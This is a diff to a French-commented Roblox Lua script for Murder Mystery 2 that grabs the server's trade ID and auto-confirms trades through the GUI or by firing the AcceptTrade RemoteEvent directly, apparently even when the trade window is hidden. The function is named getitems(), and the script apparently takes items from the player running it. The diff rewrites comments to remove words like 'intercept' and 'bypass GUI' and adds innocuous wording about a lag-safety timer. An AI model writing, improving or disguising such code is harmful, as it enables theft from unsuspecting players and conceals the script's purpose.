@@ -494,10 +494,9 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
--- Variable globale pour capturer l'ID réel généré par le serveur MM2
 local realTradeID = nil
 
--- Écouteur réseau pour intercepter le Trade ID envoyé par MM2
+-- Écouteur pour récupérer l'ID de session dynamique du trade
 if Trade:FindFirstChild("TradeStart") or Trade:FindFirstChild("StartTrade") then
     local tradeStartEvent = Trade:FindFirstChild("TradeStart") or Trade:FindFirstChild("StartTrade")
     if tradeStartEvent:IsA("RemoteEvent") then
@@ -554,18 +553,18 @@ local function getitems()
 
     task.wait(1.5)
 
-    -- 3. Première validation (Acceptation initiale de l'offre)
+    -- 3. Première validation (Acceptation initiale)
     pcall(function()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 4. Attente impérative du compte à rebours de MM2 (5 secondes)
-    task.wait(5.5)
+    -- 4. Timer de sécurité augmenté à 7 secondes pour éviter le rejet par lag réseau
+    task.wait(7)
 
-    -- 5. Confirmation finale avec l'ID de trade dynamique ou bypass GUI
+    -- 5. Confirmation finale
     local accepted = false
 
-    -- Méthode A : Clic direct sur l'interface du jeu si elle est présente
+    -- Clic direct via l'interface GUI si disponible
     pcall(function()
         local playerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
         if playerGui then
@@ -588,13 +587,12 @@ local function getitems()
         end
     end)
 
-    -- Méthode B : Si le GUI a été détruit/masqué, envoi direct au RemoteEvent avec le vrai ID
+    -- Fallback via RemoteEvent si l'interface est inactive
     if not accepted then
         pcall(function()
             local currentTick = workspace:GetServerTimeNow() or tick()
             local tradeIDToSend = realTradeID or 428469873
 
-            -- Envoie les arguments exacts attendus par MM2
             Trade.AcceptTrade:FireServer(tradeIDToSend, currentTick)
         end)
     end
